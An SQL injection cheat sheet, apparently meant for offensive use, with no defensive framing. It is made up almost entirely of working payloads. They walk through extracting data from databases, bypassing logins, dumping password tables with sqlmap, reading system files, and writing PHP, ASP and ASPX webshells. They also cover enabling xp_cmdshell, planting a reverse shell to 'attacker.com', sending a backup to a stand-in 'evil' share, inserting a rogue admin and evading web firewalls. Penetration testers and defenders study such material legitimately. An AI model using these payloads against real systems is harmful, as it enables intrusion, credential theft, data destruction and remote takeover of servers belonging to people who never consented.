# SQL Injection Guide

## Attack Progression Paths

### Path 1: Error-Based Discovery → Full Extraction
```sql
# 1. Trigger Error
'  # Basic quote test
"  # Double quote test
)'  # Bracket test
'abc  # String termination test

# 2. Version Detection
' UNION SELECT @@version,NULL--  # MSSQL
' UNION SELECT version(),NULL--  # MySQL
' AND 1=convert(int,@@version)--  # Force error with version

# 3. Column Enumeration
' ORDER BY 1--  # Start count
' ORDER BY 2--  # Increment until error
' UNION SELECT NULL,NULL--  # Match column count

# 4. Data Extraction
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

### Path 2: Blind Boolean → Data Extraction
```sql
# 1. Confirm Boolean Control
admin' AND 1=1--  # Should succeed
admin' AND 1=2--  # Should fail

# 2. Test Table Existence
admin' AND (SELECT 'x' FROM users LIMIT 1)='x'--  # True if exists

# 3. Extract Data Length
admin' AND (SELECT LENGTH(username) FROM users WHERE id=1)=5--  # Test lengths

# 4. Extract Data (character by character)
admin' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=97--  # 'a'
# Repeat for each position, use binary search for efficiency

# 5. Automate with SQLMap
sqlmap -u "http://target/page.php?id=1" --current-db  # Get database
sqlmap -u "http://target/page.php?id=1" -D dbname --tables  # Get tables
sqlmap -u "http://target/page.php?id=1" -D dbname -T users --dump  # Dump data
```

### Path 3: Time-Based → Blind Extraction
```sql
# 1. Confirm Time Control
'; IF 1=1 WAITFOR DELAY '0:0:5'--  # MSSQL
' AND SLEEP(5)--  # MySQL
' AND 1=(SELECT 1 FROM pg_sleep(5))--  # PostgreSQL

# 2. Test Table Existence
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--

# 3. Data Length Discovery
'; IF (SELECT LEN(username) FROM users WHERE id=1)=5 WAITFOR DELAY '0:0:5'--

# 4. Character Extraction
'; IF ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1))=97 WAITFOR DELAY '0:0:5'--

# 5. Automate with SQLMap
sqlmap -u "http://target/page.php?id=1" --technique=T  # Time-based
sqlmap -u "http://target/page.php?id=1" --technique=T --dump  # Extract all
```

### Path 4: UNION Success → Command Execution
```sql
# 1. Confirm UNION
' UNION SELECT NULL,NULL--  # Verify columns

# 2. File Read (if available)
' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--  # MySQL
' UNION SELECT NULL,BulkColumn FROM OPENROWSET(BULK 'c:\boot.ini', SINGLE_CLOB) AS x--  # MSSQL

# 3. File Write (if available)
' UNION SELECT NULL,'<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/shell.php'--  # MySQL
' UNION SELECT NULL,0x3C3F706870206576616C28245F504F53545B27635D5D293B3F3E INTO DUMPFILE '/var/www/shell.php'--  # MySQL hex

# 4. Command Execution (MSSQL)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
'; EXEC xp_cmdshell 'whoami'--

# 5. Command Execution (MySQL)
' UNION SELECT NULL,'nc -e /bin/bash attacker.com 4444' INTO OUTFILE '/var/www/rev.sh'--
' UNION SELECT NULL,'chmod +x /var/www/rev.sh' INTO OUTFILE '/var/www/chmod.sh'--
```

### Path 5: Authentication Bypass → Admin Access
```sql
# 1. Basic Bypasses
admin'--
admin' #
admin' /*
' OR '1'='1
') OR ('1'='1

# 2. More Complex Bypasses
' OR 'x'='x
' OR 1=1 LIMIT 1--
' OR '1'='1' LIMIT 1 -- -+
' OR 1=1; DROP members--

# 3. Extract Admin Hash
' UNION SELECT username,password FROM users WHERE admin=1--

# 4. Create New Admin
'; INSERT INTO users (username,password,admin) VALUES ('evil','evil',1)--
```

## Quick Wins Table

| Test Type | Payload | Expected Result | Next Steps |
|:-------:|:-------|:----------------|:-----------|
| **Basic Error** | `'` or `"` | SQL error message | Try error-based techniques → Extract version → List tables |
| **Auth Bypass** | `admin'--` or `' OR '1'='1'--` | Login success | Enumerate admin panel → Extract other users → Escalate privileges |
| **UNION Test** | `' ORDER BY 1--` (increment number) | No error until column count exceeded | Use column count → UNION SELECT NULL,NULL → Extract data |
| **Blind Boolean** | `' AND 1=1--` vs `' AND 1=2--` | Different responses | Create binary search → Extract data bit by bit → Dump tables |
| **Time Based** | `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--` | 5 second delay | Use for blind extraction → Automate with sqlmap → Extract data |
| **Version Check** | `' UNION SELECT @@version,NULL--` (MSSQL)<br>`' UNION SELECT version(),NULL--` (MySQL/PG) | Database version | Match version exploits → Use DB-specific attacks → Escalate access |
| **File Read** | `' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--` | File contents | Read config files → Find credentials → Access system files |
| **Command Execute** | `'; EXEC xp_cmdshell 'whoami'--` | Command output | Run system commands → Create webshell → Gain system access |
| **Bulk Extract** | `' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables--` | List of tables | Map database → Extract sensitive tables → Dump credentials |
| **WAF Bypass** | `' UnIoN/**/SeLeCt/**/1,2--` | Successful bypass | Use successful bypass → Chain with other attacks → Extract data |

## Comment Techniques

## Comment Techniques
```sql
--  # Standard line comment (SQL)
#  # MySQL line comment
/**/  # Inline comment (multiple DBs)
/*!50001 SELECT * FROM users*/  # MySQL version-specific comment
--+-  # Alternative comment
;%00  # Null byte comment
```

## Basic Authentication Bypass
```sql
admin'--  # Comment out password check
admin'#  # MySQL comment out
' OR '1'='1  # Always true condition
') OR ('1'='1  # Always true with bracket
' UNION SELECT 1,'admin','81dc9bdb52d04dc20036dbd8313ed055',1--  # Create admin session with MD5 hash of '1234'
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'  # Full bypass query
```

## String Operations
```sql
CHAR(75)+CHAR(76)+CHAR(77)  # Create string 'KLM' without quotes (MSSQL)
CHR(75)||CHR(76)||CHR(77)  # Create string 'KLM' (Oracle)
0x446F672021  # Hex string 'Dog!' (MySQL)
CONCAT('a','b','c')  # String concatenation (MySQL)
'a' + 'b' + 'c'  # String concatenation (MSSQL)
'a' || 'b' || 'c'  # String concatenation (Oracle/PostgreSQL)
ASCII('a')  # Get ASCII value
SUBSTRING('text',1,1)  # Extract single char
```

## Column Discovery
```sql
ORDER BY 1--  # Find column count
' HAVING 1=1--  # Error reveals first column
' GROUP BY table.column1 HAVING 1=1--  # Error reveals next column
' UNION SELECT NULL,NULL,NULL--  # Test column count and types
SELECT * FROM users WHERE id = -1 UNION ALL SELECT null, null, convert(image,1)  # Test column types
```

## Error-Based Techniques
```sql
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--  # Time-based
' AND (SELECT * FROM (SELECT(LOAD_FILE('/etc/passwd')))a)--  # File read
' AND (SELECT * FROM USERS) IS NULL--  # Table existence check
AND 1=convert(int,(SELECT @@version))--  # Force type conversion error
AND 1=db_name()--  # Database name error
```

## UNION Attacks
```sql
' UNION SELECT 1,2,3--  # Identify column count
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--  # List tables
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--  # List columns
' UNION ALL SELECT name,NULL,NULL FROM master..sysdatabases  # List databases (MSSQL)
```

## Database Version
```sql
SELECT @@version  # MSSQL version
SELECT version()  # PostgreSQL/MySQL version
SELECT banner FROM v$version  # Oracle version
SELECT sqlite_version()  # SQLite version
/*!50001 SELECT * FROM users*/  # MySQL version check
SELECT SERVERPROPERTY('ProductVersion')  # Detailed MSSQL version
```

## File Operations
```sql
# Basic File Operations
SELECT LOAD_FILE('/etc/passwd')  # Read file (MySQL)
SELECT TO_CHAR(DBMS_XMLGEN.getXML('select * from v$version'))  # Read file (Oracle)
EXEC xp_cmdshell 'type c:\boot.ini'  # Read file (MSSQL)

# Advanced File Operations
CREATE TABLE mydata(line VARCHAR(8000));BULK INSERT mydata FROM 'c:\windows\win.ini'  # Bulk file read
SELECT * FROM OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=C:\windows\system32\ias\ias.mdb','SELECT * FROM admin')  # Read Access db
BACKUP DATABASE master TO DISK='C:\temp\backup.bak'  # Force file write
RESTORE VERIFYONLY FROM DISK='C:\windows\system32\config\SAM'  # Test file accessibility

# BULK INSERT Error Enumeration
BULK INSERT mydata FROM 'nonexistent_file'  # Error shows file access context
BULK INSERT mydata FROM '\\nonexistent\share\file'  # Test network access
DECLARE @file VARCHAR(8000);SET @file=(SELECT TOP 1 path FROM sys.traces);BULK INSERT test FROM @file  # Read trace file

# Alternative File Methods
sp_makewebtask 'c:\inetpub\wwwroot\test.asp','SELECT ''<%=system("dir")%>'''  # Create ASP shell
EXEC master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["cmd"])%^> > c:\inetpub\wwwroot\shell.aspx'  # Create ASPX shell

```sql
SELECT LOAD_FILE('/etc/passwd')  # Read file (MySQL)
SELECT TO_CHAR(DBMS_XMLGEN.getXML('select * from v$version'))  # Read file (Oracle)
EXEC xp_cmdshell 'type c:\boot.ini'  # Read file (MSSQL)
CREATE TABLE mydata(line VARCHAR(8000));BULK INSERT mydata FROM 'c:\windows\win.ini'  # Bulk file read
SELECT * FROM OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=C:\windows\system32\ias\ias.mdb','SELECT * FROM admin')  # Read Access db
```

## Command Execution (MSSQL)
```sql
EXEC sp_configure 'show advanced options',1;RECONFIGURE  # Enable advanced options
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE  # Enable xp_cmdshell
EXEC master..xp_cmdshell 'whoami'  # Execute command
EXEC xp_regread HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName'  # Read registry
sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll'  # Add custom stored procedure
EXEC sp_makewebtask 'c:\inetpub\wwwroot\test.html', 'SELECT * FROM users'  # Write query results to file
DECLARE @shell INT;EXEC sp_oacreate 'wscript.shell',@shell OUTPUT;EXEC sp_oamethod @shell,'run',null,'cmd.exe /c dir'  # COM object command execution
```

## Advanced MSSQL Stored Procedures
```sql
EXEC xp_servicecontrol 'start','MSSQLSERVER'  # Control services
EXEC xp_availablemedia  # List drives
EXEC xp_enumdsn  # List ODBC data sources
EXEC xp_loginconfig  # Authentication details
EXEC xp_makecab 'c:\file.cab'  # Create CAB file
EXEC xp_ntsec_enumdomains  # List domains
EXEC xp_terminate_process 1234  # Kill process by PID
```

## Data Extraction
```sql
GROUP_CONCAT(column_name)  # Concatenate rows (MySQL)
STRING_AGG(column_name,',')  # Concatenate rows (MSSQL)
LISTAGG(column_name,',')  # Concatenate rows (Oracle)
SELECT * FROM master..sysmessages  # System error messages
SELECT * FROM master..sysservers  # Linked servers
SELECT * FROM sys.sql_logins  # SQL Server 2005+ logins
```

## Time-Based
```sql
IF(1=1,SLEEP(5),'false')  # MySQL delay
WAITFOR DELAY '0:0:5'  # MSSQL delay
DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)  # Oracle delay
pg_sleep(5)  # PostgreSQL delay
DECLARE @start datetime;SET @start=GETDATE();WAITFOR DELAY '0:0:5';SELECT DATEDIFF(second,@start,GETDATE())  # Precise timing
```

## Conditional Logic
```sql
IF(1=1,'true','false')  # MySQL IF
CASE WHEN 1=1 THEN 'true' ELSE 'false' END  # MSSQL/PostgreSQL CASE
DECODE(1,1,'true','false')  # Oracle DECODE
IS_SRVROLEMEMBER('sysadmin')  # Check role
IS_MEMBER('db_owner')  # Check group membership
```

## System Enumeration
```sql
# Host and Network Info
EXEC xp_cmdshell 'ipconfig /all'  # Network configuration
EXEC xp_cmdshell 'netstat -an'  # Open ports
SELECT HOST_NAME()  # SQL Server hostname
SELECT @@SERVERNAME  # Server instance name

# Linked Server Enumeration
SELECT * FROM master..sysservers  # List linked servers
SELECT * FROM sys.servers  # Alternative linked server view
EXEC sp_linkedservers  # Detailed linked server info
SELECT * FROM OpenQuery([linked_server], 'SELECT @@version')  # Test linked server access

# Service Enumeration
EXEC xp_servicecontrol 'query','MSSQLSERVER'  # Check specific service
EXEC master..xp_cmdshell 'sc query state= all'  # List all services
EXEC master..xp_cmdshell 'tasklist /v'  # Running processes

# Registry Deep Dive
EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\MSSQLSERVER'  # SQL service config
EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','SystemRoot'  # Windows directory
EXEC xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion'  # Enumerate values
```

## Cross-Database Attacks
```sql
# Direct Access
USE master; SELECT * FROM other_db.dbo.users  # Cross-database select
INSERT INTO other_db.dbo.users SELECT * FROM current_db.dbo.users  # Cross-database insert

# Linked Server
EXEC('SELECT * FROM [server_name].database.dbo.table')  # Remote table access
SELECT * FROM OPENQUERY(linked_server, 'SELECT TOP 1 table_name FROM information_schema.tables')  # Schema enum

# Alternative File Methods
BACKUP DATABASE master TO DISK = '\\evil\share\backup.bak'  # Force UNC connection
EXEC sp_makewebtask 'c:\inetpub\wwwroot\shell.asp','SELECT ''<%Execute(Request("cmd"))%>'''  # Write webshell
```

## Advanced Authentication Attacks
```sql
# Service Account Impersonation
EXECUTE AS LOGIN = 'sa'  # Try to impersonate SA
EXECUTE AS USER = 'dbo'  # Try to impersonate DB owner
REVERT  # Return to original context

# Extended Stored Procedure Attacks
sp_addextendedproc 'xp_myproc', 'c:\myproc.dll'  # Add malicious procedure
sp_dropextendedproc 'xp_myproc'  # Clean up

# Alternative Auth Methods
SELECT SYSTEM_USER  # Current system user
SELECT USER_NAME()  # Current database user
EXECUTE AS USER = 'dbo' SELECT SYSTEM_USER  # Check impersonation
```

## Advanced System Access
```sql
EXEC('SELECT * FROM OPENROWSET(''SQLOLEDB'',''server=target;uid=sa;pwd=pass'',''SELECT 1'')')  # Remote connection
EXEC('SELECT * FROM OPENDATASOURCE(''SQLOLEDB'',''Data Source=target;User ID=sa;Password=pass'').database.dbo.table')  # Remote table
SELECT * FROM OPENQUERY(linked_server,'SELECT @@version')  # Query linked server
```

## WAF Bypass
```sql
SeL/**/ecT  # Split keywords
%53%45%4c%45%43%54  # URL encode
CONCAT('SE','LECT')  # String concat
0x73656c656374  # Hex encode
CHAR(115,101,108,101,99,116)  # ASCII chars
```



